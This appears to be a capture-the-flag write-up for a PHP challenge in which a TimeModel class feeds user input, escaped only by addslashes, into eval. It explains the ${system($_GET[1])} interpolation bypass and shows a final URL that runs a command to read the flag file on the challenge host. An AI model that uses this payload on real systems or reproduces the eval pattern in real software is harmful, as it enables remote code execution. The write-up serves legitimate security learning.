---

## Vulnerable Code @ TimeModel.php

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```
## vulnerable code + explination
```php
<?php
    public function getTime()
    { 
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    } 
?>
```
- eval(), Evaluate a string as PHP code
- we use this to get PHP code execution
- double qoutes are sanitized here

## Uh-Oh remember that the in this situation double qoutes are sanitized!
```php
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

```php
so how do we bypass this???
instead of: ${system("ls")}
we would do: ${system($_GET[1])}&1=ls
```

---

## win

```
http://209.97.129.28:30441/?format=${system($_GET[1])}&1=cat%20../flagIcYOI
```
- we use ${system($_GET[1])}&1=ls as our payload
```php
         ^ ^      ^         ^
         | |      |         |
         | |      |         | & is our pointer to the index location 1, which we can use to execute arbitrary system commands via system() respectively 
         | |      |
         | |      | HTTP GET variable, we hold this dictionary with the key number "1" ; $_GET[1]
         | |
         | | Execute an external program and display the output
         | 
         | ${} provides a a way to embed a variable, array, or object property in a string.
```
